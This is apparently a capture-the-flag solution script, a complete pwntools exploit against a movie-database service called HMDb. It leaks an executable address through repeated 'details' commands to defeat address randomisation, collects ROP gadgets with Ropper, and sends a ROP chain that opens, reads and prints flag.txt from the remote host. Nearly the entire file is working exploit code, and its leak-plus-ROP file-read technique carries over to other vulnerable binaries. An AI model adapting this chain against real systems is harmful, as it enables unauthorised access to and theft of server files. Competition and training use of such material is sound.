from shutil import copyfile

from pwn import *
from ropper import RopperService

options = {
    'color': False,
    'badbytes': '0a',
    'all': False,
    'inst_count': 6,
    'type': 'all',
    'detailed': False,
}

rs = RopperService(options)
exe = ELF("HMDb.sym.elf")
context.binary = exe
HOST = "hmdb.challs.cyberchallenge.it"
PORT = 6024
io = remote(HOST, PORT)
context.log_level = "info"
offset = 5856
rbp_offset = 56


def search_gadget(exact, search):
    if exact == "ret":
        g = list(rs.search(search="ret"))[-1][1]
        log.info(f"Found gadget {g._gadget} for {exact}")
        return g.address
    for f, gadget in rs.search(search=search):
        if exact in gadget._gadget:
            log.info(f"Found gadget {gadget._gadget} for {exact}")
            return gadget.address
    log.error(f"Gadget not found for exact {exact} with search {search}")


def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def prettify_shellcode(shellcode, size=None):
    if size is None:
        size = 16 if context.arch == "amd64" else 8
    retval = []
    for chunk in chunks(shellcode, size):
        unfunc = u64 if size == 8 else u32
        retval.append(unfunc(chunk.ljust(size, b"\x00")))
    retval = list(map(lambda x: f"{x:#016x}", retval))
    pretty = "\n".join(retval)
    log.info(f"Shellcode {len(shellcode)}:" + "\n" f"{pretty}")


def increase_size():
    io.recvuntil(b"quit")
    io.sendline(b"details 13")
    size = 10
    for i in range(size):
        io.recvuntil(b">")
        io.sendline(b"details 13")


def print_dettagli(i):
    retval = io.recvuntil(b">")
    io.sendline(f"details {i}")
    return retval


def leak_exe_addr():
    print_dettagli(26)
    io.recvuntil(b"Hacktivists")
    addr = u64(io.recvline().strip().ljust(8, b"\x00"))
    log.info(f"address: {addr:#08x}")
    exe.address = addr - offset
    log.info(f"exe addr --> {exe.address:#08x}")


def find_gadgets():
    from os import system

    copyfile("HMDb", "HMDb.bak")
    rs.addFile("HMDb.bak")
    rs.setImageBaseFor("HMDb.bak", exe.address)
    rs.loadGadgetsFor()
    gadgets = dict()
    gadgets["POP_RDI"] = search_gadget("pop rdi; ret;", "pop rdi")
    gadgets["POP_RSI_POP_R15"] = search_gadget("pop rsi; pop r15; ret;", "pop rsi")
    gadgets["ADD_RSP_8"] = search_gadget("add rsp, 8; ret;", "add rsp")
    gadgets["NOP"] = search_gadget("ret", "ret")
    system("rm HMDb.bak")
    return gadgets


def print_flag(gadgets):
    payload = dict()

    bufferone = exe.bss(300)
    bufferone2 = exe.bss(400)
    rop = [
        exe.sym.help_command,
        gadg["POP_RDI"],
        0,
        gadg["POP_RSI_POP_R15"],
        bufferone,
        0,
        exe.sym.read,
        # Read fatta
        exe.sym.stampa_film,
        gadg["POP_RDI"],
        bufferone,
        gadg["POP_RSI_POP_R15"],
        0,
        0,
        exe.sym.open,
        exe.sym.help_command,
        gadg["POP_RDI"],
        3,
        gadg["POP_RSI_POP_R15"],
        bufferone2,
        0,
        exe.sym.read,
        gadg["POP_RDI"],
        1,
        gadg["POP_RSI_POP_R15"],
        bufferone2,
        0,
        exe.sym.write,
        gadg["POP_RDI"],
        0,
        exe.sym.exit,
    ]
    payload[rbp_offset] = rop

    payload = fit(payload)
    io.recvuntil(">")
    io.sendline(payload)
    io.recvuntil(">")
    io.sendline("quit")
    io.recvuntil("quit")
    io.sendline(b"flag.txt\x00")
    io.recvuntil("quit")
    flag = io.recvuntil("}").strip().replace(b"\x00", b"").decode()
    log.success("Flag --> %s" % flag)


if __name__ == "__main__":
    increase_size()
    leak_exe_addr()
    gadg = find_gadgets()
    print_flag(gadg)
